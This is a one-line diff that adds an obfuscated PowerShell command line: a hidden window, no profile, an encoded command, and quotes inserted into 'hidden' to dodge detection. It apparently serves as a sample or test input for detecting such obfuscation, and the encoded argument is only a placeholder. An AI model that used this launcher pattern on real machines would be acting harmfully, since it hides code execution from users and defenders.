@@ -1,0 +1,1 @@
+powershell -WindowStyle hid"de"n -nop -encodedcommand encoded1lbW1vdmcommand
